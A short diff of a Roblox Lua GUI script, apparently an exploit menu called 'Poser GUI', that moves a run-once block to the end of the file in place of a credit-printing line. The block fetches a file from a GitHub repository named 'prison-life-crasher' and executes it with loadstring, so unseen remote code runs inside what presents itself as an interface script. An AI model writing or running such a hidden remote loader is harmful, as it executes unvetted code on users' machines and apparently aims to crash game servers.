@@ -30,12 +30,6 @@ local Tabs = {
 	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
 }
 
-if not _G.hasExecuted2 then
- 
-_G.ScriptIs = "Poser GUI"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/a", true))()
-_G.hasExecuted2 = true
-end
 
 local Options = Fluent.Options
 
@@ -684,5 +678,11 @@ Tabs.User:AddButton({
 })
 
 ----------------------------------------
-
-print (tostring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/PrintCredit/main/print", true)))
+if not _G.hasExecuted2 then
+ 
+_G.ScriptIs = "Poser GUI"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/a", true))()
+_G.hasExecuted2 = true
+else
+warn (" ")
+end
